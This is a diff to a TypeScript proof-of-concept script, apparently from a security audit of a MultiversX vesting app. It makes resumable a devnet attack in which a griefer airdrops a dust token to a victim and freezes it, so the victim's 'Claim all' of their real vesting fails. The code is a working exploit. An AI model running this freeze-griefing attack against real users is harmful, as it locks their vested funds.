@@ -105,47 +105,61 @@ if (!evil) {
 console.log(`dust token ${evil}`);
 
 // 2. The victim's real vesting, half way through, and one dust vesting that
-// has fully vested. Both claim keys land in the victim's wallet.
-const real = await create(
-  "audit5 real vesting",
-  victim.address,
-  amount(100n, 18),
-  TFOX,
-  { start: now - DAY, cliff: now - DAY, cliff_amount: 0n, end: now + DAY, curve: "Linear" },
-);
-const dust = await create(
-  "audit5 dust vesting",
-  victim.address,
-  1n,
-  evil,
-  { start: now - 2n * DAY, cliff: now - 2n * DAY, cliff_amount: 0n, end: now - DAY, curve: "Linear" },
-);
+// has fully vested. Both claim keys land in the victim's wallet. A run that
+// stopped after this step gives their ids: AUDIT5_VESTINGS=<real>,<dust>.
+const given = process.env.AUDIT5_VESTINGS?.split(",").map(BigInt);
+const real =
+  given?.[0] ??
+  (await create("audit5 real vesting", victim.address, amount(100n, 18), TFOX, {
+    start: now - DAY,
+    cliff: now - DAY,
+    cliff_amount: 0n,
+    end: now + DAY,
+    curve: "Linear",
+  }));
+const dust =
+  given?.[1] ??
+  (await create("audit5 dust vesting", victim.address, 1n, evil, {
+    start: now - 2n * DAY,
+    cliff: now - 2n * DAY,
+    cliff_amount: 0n,
+    end: now - DAY,
+    curve: "Linear",
+  }));
 console.log(`real vesting ${real}, dust vesting ${dust}`);
 await report([real, dust], [TFOX, evil]);
 
-// 3. An airdrop of one unit, then the freeze.
-const airdrop = await transfers.createTransactionForTransfer(griefer, griefer.getNonceThenIncrement(), {
-  receiver: victim.address,
-  tokenTransfers: [new TokenTransfer({ token: new Token({ identifier: evil }), amount: 1n })],
-});
-await send("airdrop one unit to the victim", airdrop);
-// sdk-core's createTransactionForFreezing addresses the transaction to its own
-// sender, so the freeze never runs: the system contract is named here.
-const freeze = new Transaction({
-  sender: griefer.address,
-  receiver: Address.newFromBech32("erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzllls8a5w6u"),
-  chainID: "D",
-  gasLimit: 60_000_000n,
-  nonce: griefer.getNonceThenIncrement(),
-  data: Buffer.from(`freeze@${Buffer.from(evil).toString("hex")}@${victim.address.toHex()}`),
-});
-freeze.signature = await griefer.signTransaction(freeze);
-await send("freeze the victim for the dust token", freeze);
-const frozen = (await (
-  await fetch(`https://devnet-gateway.multiversx.com/address/${victim.address.toBech32()}/esdt/${evil}`)
-).json()) as { data?: { tokenData?: { properties?: string } } };
-console.log(`victim's dust token properties after the freeze: ${JSON.stringify(frozen.data?.tokenData?.properties)}`);
-await new Promise((resolve) => setTimeout(resolve, 12_000));
+// 3. An airdrop of one unit, then the freeze, unless an earlier run froze the
+// victim already (a freeze lasts until it is undone, and refuses the airdrop).
+const properties = async () =>
+  (
+    (await (
+      await fetch(`https://devnet-gateway.multiversx.com/address/${victim.address.toBech32()}/esdt/${evil}`)
+    ).json()) as { data?: { tokenData?: { properties?: string } } }
+  ).data?.tokenData?.properties;
+if ((await properties()) === "0100") {
+  console.log("the victim is frozen for the dust token already");
+} else {
+  const airdrop = await transfers.createTransactionForTransfer(griefer, griefer.getNonceThenIncrement(), {
+    receiver: victim.address,
+    tokenTransfers: [new TokenTransfer({ token: new Token({ identifier: evil }), amount: 1n })],
+  });
+  await send("airdrop one unit to the victim", airdrop);
+  // sdk-core's createTransactionForFreezing addresses the transaction to its
+  // own sender, so the freeze never runs: the system contract is named here.
+  const freeze = new Transaction({
+    sender: griefer.address,
+    receiver: Address.newFromBech32("erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzllls8a5w6u"),
+    chainID: "D",
+    gasLimit: 60_000_000n,
+    nonce: griefer.getNonceThenIncrement(),
+    data: Buffer.from(`freeze@${Buffer.from(evil).toString("hex")}@${victim.address.toHex()}`),
+  });
+  freeze.signature = await griefer.signTransaction(freeze);
+  await send("freeze the victim for the dust token", freeze);
+  await new Promise((resolve) => setTimeout(resolve, 12_000));
+  console.log(`victim's dust token properties after the freeze: ${JSON.stringify(await properties())}`);
+}
 
 // 4. The victim presses Claim all: both keys, one transaction, simulated first
 // by the estimator as the site's is.
